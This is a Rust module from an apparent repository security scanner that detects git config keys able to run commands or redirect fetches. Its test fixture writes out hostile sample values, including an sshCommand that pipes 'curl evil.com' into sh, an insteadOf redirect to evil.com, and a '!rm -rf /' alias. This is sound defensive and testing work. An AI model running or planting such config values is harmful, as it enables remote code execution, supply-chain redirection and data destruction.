use crate::agent::{format_rel_path, make_unreadable_finding};
use crate::report::model::{Action, Category, Finding, Severity};
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone)]
pub struct GitDirs {
    pub git_dir: PathBuf,
    pub common_dir: PathBuf,
    pub config_paths: Vec<PathBuf>,
}

#[derive(Debug, thiserror::Error)]
pub enum GitConfigError {
    #[error("IO error reading {path}: {source}")]
    Io {
        path: PathBuf,
        source: std::io::Error,
    },
    #[error("Failed to parse git config at {path}: {source}")]
    Parse {
        path: PathBuf,
        source: Box<dyn std::error::Error + Send + Sync>,
    },
}

pub fn resolve_git_dirs(repo_root: &Path) -> Option<GitDirs> {
    let dot_git = repo_root.join(".git");
    if fs::symlink_metadata(&dot_git).is_err() {
        return None;
    }

    let (git_dir, common_dir) = if !dot_git.is_dir() {
        let content = fs::read_to_string(&dot_git).ok()?;
        let gitdir_line = content
            .lines()
            .find(|l| l.trim_start().starts_with("gitdir:"))?;
        let rel_path = gitdir_line.trim_start().strip_prefix("gitdir:")?.trim();
        if rel_path.is_empty() {
            return None;
        }
        let resolved_git_dir = if Path::new(rel_path).is_absolute() {
            PathBuf::from(rel_path)
        } else {
            repo_root.join(rel_path)
        };
        if fs::symlink_metadata(&resolved_git_dir).is_err() {
            return None;
        }
        let canonical_git_dir = resolved_git_dir.canonicalize().unwrap_or(resolved_git_dir);

        let commondir_file = canonical_git_dir.join("commondir");
        let common = if commondir_file.is_file() {
            if let Ok(c) = fs::read_to_string(&commondir_file) {
                let trimmed = c.trim();
                let cd = canonical_git_dir.join(trimmed);
                cd.canonicalize().unwrap_or(cd)
            } else {
                canonical_git_dir.clone()
            }
        } else {
            canonical_git_dir.clone()
        };
        (canonical_git_dir, common)
    } else {
        if let Err(e) = fs::read_dir(&dot_git)
            && e.kind() == std::io::ErrorKind::PermissionDenied
        {
            return None;
        }
        let canonical_dot_git = dot_git.canonicalize().unwrap_or(dot_git);
        (canonical_dot_git.clone(), canonical_dot_git)
    };

    let mut config_paths = Vec::new();
    let main_config = common_dir.join("config");
    if fs::symlink_metadata(&main_config).is_ok() {
        config_paths.push(main_config);
    }

    let worktree_config = git_dir.join("config.worktree");
    if fs::symlink_metadata(&worktree_config).is_ok() {
        config_paths.push(worktree_config);
    }

    Some(GitDirs {
        git_dir,
        common_dir,
        config_paths,
    })
}

pub fn scan_git_config(repo_root: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let dot_git = repo_root.join(".git");

    if fs::symlink_metadata(&dot_git).is_ok() {
        let git_dirs = resolve_git_dirs(repo_root);
        if git_dirs.is_none() {
            findings.push(make_unreadable_finding(repo_root, &dot_git));
            return findings;
        }
    }

    let git_dirs = match resolve_git_dirs(repo_root) {
        Some(d) => d,
        None => return findings,
    };

    let mut visited_includes = HashSet::new();
    for config_path in &git_dirs.config_paths {
        scan_config_file_recursive(
            repo_root,
            config_path,
            1,
            &mut visited_includes,
            &mut findings,
        );
    }

    findings
}

fn find_line_number(file_content: &str, key_fragment: &str) -> Option<usize> {
    for (idx, line) in file_content.lines().enumerate() {
        let trimmed = line.trim();
        if !trimmed.starts_with('#') && !trimmed.starts_with(';') && trimmed.contains(key_fragment)
        {
            return Some(idx + 1);
        }
    }
    None
}

fn scan_config_file_recursive(
    repo_root: &Path,
    config_path: &Path,
    depth: usize,
    visited: &mut HashSet<PathBuf>,
    findings: &mut Vec<Finding>,
) {
    if depth > 5 {
        findings.push(Finding {
            id: "PT-GIT-011".into(),
            rule_name: "GitConfigIncludeSmuggling".into(),
            severity: Severity::High,
            category: Category::ConfigurationSmuggling,
            message: format!(
                "Git configuration include depth exceeded limit (depth {}) at {}",
                depth,
                config_path.display()
            ),
            file_path: format_rel_path(repo_root, config_path),
            line: None,
            key: Some("include.path".into()),
            value: None,
            action: Action::WarnOnly,
            remediation: "Eliminate deeply nested or recursive include files in git configuration."
                .into(),
        });
        return;
    }

    let canonical = config_path
        .canonicalize()
        .unwrap_or_else(|_| config_path.to_path_buf());
    if !visited.insert(canonical) {
        findings.push(Finding {
            id: "PT-GIT-012".into(),
            rule_name: "GitConfigCircularInclude".into(),
            severity: Severity::High,
            category: Category::ConfigurationSmuggling,
            message: format!(
                "Circular git config include detected: {}",
                config_path.display()
            ),
            file_path: format_rel_path(repo_root, config_path),
            line: None,
            key: Some("include.path".into()),
            value: None,
            action: Action::WarnOnly,
            remediation: "Remove circular git config include directives.".into(),
        });
        return;
    }

    let raw_bytes = match fs::read(config_path) {
        Ok(b) => b,
        Err(_) => {
            findings.push(make_unreadable_finding(repo_root, config_path));
            return;
        }
    };
    let content_str = String::from_utf8_lossy(&raw_bytes).to_string();

    let file = match gix_config::File::from_bytes_no_includes(
        &raw_bytes,
        gix_config::file::Metadata::api(),
        gix_config::file::init::Options::default(),
    ) {
        Ok(f) => f,
        Err(_) => {
            scan_raw_config_lines(repo_root, config_path, &content_str, findings);
            findings.push(make_unreadable_finding(repo_root, config_path));
            return;
        }
    };

    let rel_file = format_rel_path(repo_root, config_path);

    for section in file.sections() {
        let section_name = section.header().name().to_string();
        let sub_name = section.header().subsection_name().map(|s| s.to_string());

        for key in section.value_names() {
            let key_name = key.to_string();
            let full_key = if let Some(sub) = &sub_name {
                format!("{}.{}.{}", section_name, sub, key_name)
            } else {
                format!("{}.{}", section_name, key_name)
            };

            for val in section.values(&key) {
                let val_str = String::from_utf8_lossy(val.as_ref()).to_string();
                let line_num = find_line_number(&content_str, &key_name);

                evaluate_git_key_value(
                    repo_root,
                    &rel_file,
                    &full_key,
                    &section_name,
                    sub_name.as_deref(),
                    &key_name,
                    &val_str,
                    line_num,
                    findings,
                );

                if (section_name == "include" && key_name == "path")
                    || (section_name.starts_with("includeif") && key_name == "path")
                {
                    handle_include(
                        repo_root,
                        config_path,
                        &val_str,
                        depth,
                        line_num,
                        visited,
                        findings,
                    );
                }
            }
        }
    }
}

fn handle_include(
    repo_root: &Path,
    current_config: &Path,
    include_val: &str,
    depth: usize,
    line: Option<usize>,
    visited: &mut HashSet<PathBuf>,
    findings: &mut Vec<Finding>,
) {
    let base_dir = current_config.parent().unwrap_or(repo_root);
    let target_path = if let Some(stripped) = include_val.strip_prefix("~/") {
        if let Some(home) = std::env::var_os("HOME") {
            PathBuf::from(home).join(stripped)
        } else {
            PathBuf::from(include_val)
        }
    } else if Path::new(include_val).is_absolute() {
        PathBuf::from(include_val)
    } else {
        base_dir.join(include_val)
    };

    let target_canonical = target_path.canonicalize().ok();
    let repo_canonical = repo_root
        .canonicalize()
        .unwrap_or_else(|_| repo_root.to_path_buf());

    let is_external = match &target_canonical {
        Some(canon) => !canon.starts_with(&repo_canonical),
        None => true,
    };

    if is_external {
        findings.push(Finding {
            id: "PT-GIT-010".into(),
            rule_name: "GitConfigIncludeSmuggling".into(),
            severity: Severity::High,
            category: Category::ConfigurationSmuggling,
            message: format!(
                "Git configuration includes external or non-local path '{}'",
                include_val
            ),
            file_path: format_rel_path(repo_root, current_config),
            line,
            key: Some("include.path".into()),
            value: Some(include_val.into()),
            action: Action::WarnOnly,
            remediation:
                "Do not include external or arbitrary filesystem paths in repository git configs."
                    .into(),
        });
    }

    if let Some(valid_target) = target_canonical {
        if valid_target.is_file() {
            scan_config_file_recursive(repo_root, &valid_target, depth + 1, visited, findings);
        }
    } else if (!is_external || target_path.starts_with(repo_root))
        && fs::symlink_metadata(&target_path).is_ok()
    {
        scan_config_file_recursive(repo_root, &target_path, depth + 1, visited, findings);
    }
}

fn is_allowlisted_filter(key: &str, value: &str) -> bool {
    let trimmed = value.trim();
    if key.starts_with("filter.lfs.") || key == "filter.lfs" {
        return trimmed.starts_with("git-lfs") || trimmed.contains("git-lfs ");
    }
    false
}

#[allow(clippy::too_many_arguments)]
fn evaluate_git_key_value(
    _repo_root: &Path,
    rel_file: &str,
    full_key: &str,
    section: &str,
    _subsection: Option<&str>,
    key: &str,
    val: &str,
    line: Option<usize>,
    findings: &mut Vec<Finding>,
) {
    let sec_lower = section.to_ascii_lowercase();
    let key_lower = key.to_ascii_lowercase();

    if sec_lower == "core" && key_lower == "fsmonitor" {
        let val_trimmed = val.trim();
        if val_trimmed != "false" && val_trimmed != "0" && !val_trimmed.is_empty() {
            findings.push(Finding {
                id: "PT-GIT-001".into(),
                rule_name: "GitFsMonitor".into(),
                severity: Severity::Critical,
                category: Category::GitExecutionSink,
                message: format!(
                    "Malicious execution sink 'core.fsmonitor' configured to execute command: '{val}'"
                ),
                file_path: rel_file.to_string(),
                line,
                key: Some(full_key.to_string()),
                value: Some(val.to_string()),
                action: Action::NeutralizableViaEnv,
                remediation: "Remove 'core.fsmonitor' or launch via 'pretrust run' to neutralize.".into(),
            });
        }
    } else if sec_lower == "core" && key_lower == "hookspath" {
        findings.push(Finding {
            id: "PT-GIT-002".into(),
            rule_name: "GitHooksPath".into(),
            severity: Severity::Critical,
            category: Category::GitExecutionSink,
            message: format!(
                "Execution sink 'core.hooksPath' redirects git hook execution to: '{val}'"
            ),
            file_path: rel_file.to_string(),
            line,
            key: Some(full_key.to_string()),
            value: Some(val.to_string()),
            action: Action::NeutralizableViaEnv,
            remediation: "Unset 'core.hooksPath' or use pretrust runtime wrapper.".into(),
        });
    } else if sec_lower == "diff" && key_lower == "external" {
        findings.push(Finding {
            id: "PT-GIT-003".into(),
            rule_name: "GitDiffExternal".into(),
            severity: Severity::High,
            category: Category::GitExecutionSink,
            message: format!(
                "Execution sink 'diff.external' triggers shell command on git diff: '{val}'"
            ),
            file_path: rel_file.to_string(),
            line,
            key: Some(full_key.to_string()),
            value: Some(val.to_string()),
            action: Action::NeutralizableViaEnv,
            remediation: "Remove 'diff.external' from git configuration.".into(),
        });
    } else if sec_lower == "diff" && (key_lower == "textconv" || key_lower == "command") {
        let rule_name = if key_lower == "textconv" {
            "GitDiffTextconv"
        } else {
            "GitDiffCommand"
        };
        let id = if key_lower == "textconv" {
            "PT-GIT-004"
        } else {
            "PT-GIT-005"
        };
        findings.push(Finding {
            id: id.into(),
            rule_name: rule_name.into(),
            severity: Severity::High,
            category: Category::GitExecutionSink,
            message: format!(
                "Diff driver '{full_key}' executes custom command during diffing: '{val}'"
            ),
            file_path: rel_file.to_string(),
            line,
            key: Some(full_key.to_string()),
            value: Some(val.to_string()),
            action: Action::NeutralizableViaEnv,
            remediation: "Ensure diff driver commands are trusted or run inside pretrust wrapper."
                .into(),
        });
    } else if sec_lower == "filter"
        && (key_lower == "clean" || key_lower == "smudge" || key_lower == "process")
    {
        if is_allowlisted_filter(full_key, val) {
            return;
        }
        let (id, rule_name) = match key_lower.as_str() {
            "clean" => ("PT-GIT-006", "GitFilterClean"),
            "smudge" => ("PT-GIT-007", "GitFilterSmudge"),
            _ => ("PT-GIT-008", "GitFilterProcess"),
        };
        findings.push(Finding {
            id: id.into(),
            rule_name: rule_name.into(),
            severity: Severity::High,
            category: Category::GitExecutionSink,
            message: format!(
                "Filter driver '{full_key}' executes shell command on checkout/commit: '{val}'"
            ),
            file_path: rel_file.to_string(),
            line,
            key: Some(full_key.to_string()),
            value: Some(val.to_string()),
            action: Action::NeutralizableViaEnv,
            remediation: "Remove untrusted filter definitions from git configuration.".into(),
        });
    } else if sec_lower == "core" && key_lower == "sshcommand" {
        findings.push(Finding {
            id: "PT-GIT-009".into(),
            rule_name: "GitSshCommand".into(),
            severity: Severity::High,
            category: Category::GitExecutionSink,
            message: format!(
                "Execution sink 'core.sshCommand' executes custom binary during network operations: '{val}'"
            ),
            file_path: rel_file.to_string(),
            line,
            key: Some(full_key.to_string()),
            value: Some(val.to_string()),
            action: Action::NeutralizableViaEnv,
            remediation: "Unset 'core.sshCommand' or verify binary trustworthiness.".into(),
        });
    } else if sec_lower == "credential" && key_lower == "helper" {
        if !val.trim().is_empty() {
            findings.push(Finding {
                id: "PT-GIT-013".into(),
                rule_name: "GitCredentialHelper".into(),
                severity: Severity::High,
                category: Category::GitExecutionSink,
                message: format!(
                    "Execution sink 'credential.helper' executes helper process: '{val}'"
                ),
                file_path: rel_file.to_string(),
                line,
                key: Some(full_key.to_string()),
                value: Some(val.to_string()),
                action: Action::NeutralizableViaEnv,
                remediation: "Unset repository-local 'credential.helper'.".into(),
            });
        }
    } else if sec_lower == "url" && key_lower == "insteadof" {
        findings.push(Finding {
            id: "PT-GIT-014".into(),
            rule_name: "GitUrlInsteadOf".into(),
            severity: Severity::Critical,
            category: Category::GitExecutionSink,
            message: format!(
                "Unneutralizable redirect sink '{full_key}' redirects fetches/pushes from '{val}'"
            ),
            file_path: rel_file.to_string(),
            line,
            key: Some(full_key.to_string()),
            value: Some(val.to_string()),
            action: Action::RequiresManualRemediation,
            remediation: "Remove 'url.<base>.insteadOf' redirection or pass '--allow-sinks'."
                .into(),
        });
    } else if sec_lower == "alias" {
        let val_trimmed = val.trim();
        if val_trimmed.starts_with('!') {
            findings.push(Finding {
                id: "PT-GIT-015".into(),
                rule_name: "GitShellAlias".into(),
                severity: Severity::High,
                category: Category::GitExecutionSink,
                message: format!(
                    "Git shell alias '!...' in repository config can execute arbitrary commands: '{full_key} = {val}'"
                ),
                file_path: rel_file.to_string(),
                line,
                key: Some(full_key.to_string()),
                value: Some(val.to_string()),
                action: Action::RequiresManualRemediation,
                remediation: "Remove shell aliases starting with '!' from repository git config.".into(),
            });
        }
    }
}

fn scan_raw_config_lines(
    repo_root: &Path,
    config_path: &Path,
    content: &str,
    findings: &mut Vec<Finding>,
) {
    let rel_file = format_rel_path(repo_root, config_path);
    let mut current_section = String::new();
    let mut current_subsection: Option<String> = None;

    for (idx, raw_line) in content.lines().enumerate() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }

        if line.starts_with('[') && line.ends_with(']') {
            let inside = &line[1..line.len() - 1].trim();
            if let Some((sec, sub)) = inside.split_once(' ') {
                current_section = sec.trim().to_ascii_lowercase();
                current_subsection = Some(sub.trim().trim_matches('"').to_string());
            } else {
                current_section = inside.to_ascii_lowercase();
                current_subsection = None;
            }
            continue;
        }

        if let Some((k, v)) = line.split_once('=') {
            let key = k.trim().to_ascii_lowercase();
            let val = v.trim().trim_matches('"');
            let full_key = if let Some(sub) = &current_subsection {
                format!("{}.{}.{}", current_section, sub, key)
            } else {
                format!("{}.{}", current_section, key)
            };

            evaluate_git_key_value(
                repo_root,
                &rel_file,
                &full_key,
                &current_section,
                current_subsection.as_deref(),
                &key,
                val,
                Some(idx + 1),
                findings,
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn test_scan_fsmonitor_and_sinks() {
        let dir = tempdir().unwrap();
        let dot_git = dir.path().join(".git");
        fs::create_dir_all(&dot_git).unwrap();
        let config_file = dot_git.join("config");

        fs::write(
            &config_file,
            r#"
[core]
    fsmonitor = "evil_fsmonitor.sh"
    hooksPath = "/tmp/evil-hooks"
    sshCommand = "curl evil.com | sh"
[diff]
    external = "diff_pwn"
[diff "custom"]
    textconv = "malicious_textconv"
    command = "malicious_command"
[filter "bad"]
    clean = "evil_clean"
    smudge = "evil_smudge"
    process = "evil_process"
[filter "lfs"]
    clean = "git-lfs clean -- %f"
    smudge = "git-lfs smudge -- %f"
    process = "git-lfs filter-process"
[credential]
    helper = "!pwn"
[url "https://evil.com/"]
    insteadOf = "https://github.com/"
[alias]
    st = "status"
    pwn = "!rm -rf /"
"#,
        )
        .unwrap();

        let findings = scan_git_config(dir.path());

        let fsmonitor = findings
            .iter()
            .find(|f| f.rule_name == "GitFsMonitor")
            .expect("fsmonitor");
        assert_eq!(fsmonitor.severity, Severity::Critical);
        assert_eq!(fsmonitor.action, Action::NeutralizableViaEnv);

        let hookspath = findings
            .iter()
            .find(|f| f.rule_name == "GitHooksPath")
            .expect("hooksPath");
        assert_eq!(hookspath.severity, Severity::Critical);

        let ssh = findings
            .iter()
            .find(|f| f.rule_name == "GitSshCommand")
            .expect("sshCommand");
        assert_eq!(ssh.severity, Severity::High);

        let diff_ext = findings
            .iter()
            .find(|f| f.rule_name == "GitDiffExternal")
            .expect("diff.external");
        assert_eq!(diff_ext.severity, Severity::High);

        let diff_tc = findings
            .iter()
            .find(|f| f.rule_name == "GitDiffTextconv")
            .expect("textconv");
        assert_eq!(diff_tc.severity, Severity::High);

        let diff_cmd = findings
            .iter()
            .find(|f| f.rule_name == "GitDiffCommand")
            .expect("diff command");
        assert_eq!(diff_cmd.severity, Severity::High);

        let bad_clean = findings
            .iter()
            .find(|f| f.rule_name == "GitFilterClean")
            .expect("filter.clean");
        assert_eq!(bad_clean.severity, Severity::High);

        // Verify git-lfs is allowlisted
        assert!(
            findings
                .iter()
                .all(|f| f.value.as_deref() != Some("git-lfs clean -- %f"))
        );

        let cred = findings
            .iter()
            .find(|f| f.rule_name == "GitCredentialHelper")
            .expect("credential.helper");
        assert_eq!(cred.severity, Severity::High);

        let url = findings
            .iter()
            .find(|f| f.rule_name == "GitUrlInsteadOf")
            .expect("url.insteadOf");
        assert_eq!(url.severity, Severity::Critical);
        assert_eq!(url.action, Action::RequiresManualRemediation);
        assert!(url.is_blocking_for_run());

        let alias_pwn = findings
            .iter()
            .find(|f| f.rule_name == "GitShellAlias")
            .expect("alias.pwn");
        assert_eq!(alias_pwn.severity, Severity::High);
        assert_eq!(alias_pwn.action, Action::RequiresManualRemediation);

        // Verify safe alias "st" is not flagged
        assert!(
            findings
                .iter()
                .all(|f| f.key.as_deref() != Some("alias.st"))
        );
    }

    #[test]
    fn test_gitfile_and_worktree_resolution() {
        let temp = tempdir().unwrap();
        let repo = temp.path().join("repo");
        let common = temp.path().join("common_git");
        fs::create_dir_all(&repo).unwrap();
        fs::create_dir_all(&common).unwrap();

        fs::write(common.join("config"), "[core]\nfsmonitor = malicious\n").unwrap();
        fs::write(repo.join(".git"), format!("gitdir: {}\n", common.display())).unwrap();

        let findings = scan_git_config(&repo);
        assert!(findings.iter().any(|f| f.rule_name == "GitFsMonitor"));
    }

    #[test]
    fn malformed_config_keeps_raw_sink_and_blocks_for_incomplete_coverage() {
        let dir = tempdir().unwrap();
        let dot_git = dir.path().join(".git");
        fs::create_dir_all(&dot_git).unwrap();
        fs::write(
            dot_git.join("config"),
            "[core]\nfsmonitor = hostile\n[broken\n",
        )
        .unwrap();

        let findings = scan_git_config(dir.path());
        assert!(findings.iter().any(|f| f.rule_name == "GitFsMonitor"));
        assert!(findings.iter().any(|f| f.id == "PT-GIT-001"));
        let coverage = findings.iter().find(|f| f.id == "PT-CFG-001").unwrap();
        assert!(coverage.is_blocking_for_run());
        assert_eq!(coverage.file_path, ".git/config");
        assert!(!coverage.message.contains(dir.path().to_str().unwrap()));
        assert!(!coverage.message.contains("hostile"));
    }

    #[test]
    fn valid_and_missing_git_config_do_not_emit_coverage_finding() {
        let missing = tempdir().unwrap();
        assert!(
            scan_git_config(missing.path())
                .iter()
                .all(|f| f.id != "PT-CFG-001")
        );

        let dir = tempdir().unwrap();
        let dot_git = dir.path().join(".git");
        fs::create_dir_all(&dot_git).unwrap();
        fs::write(dot_git.join("config"), "[core]\nfsmonitor = false\n").unwrap();
        assert!(
            scan_git_config(dir.path())
                .iter()
                .all(|f| f.id != "PT-CFG-001")
        );
    }

    #[cfg(unix)]
    #[test]
    fn broken_git_config_symlink_is_reported_as_present_unreadable_file() {
        use std::os::unix::fs::symlink;

        let dir = tempdir().unwrap();
        let dot_git = dir.path().join(".git");
        fs::create_dir_all(&dot_git).unwrap();
        symlink("missing-config", dot_git.join("config")).unwrap();
        let findings = scan_git_config(dir.path());
        assert!(findings.iter().any(|f| f.id == "PT-CFG-001"));
    }
}
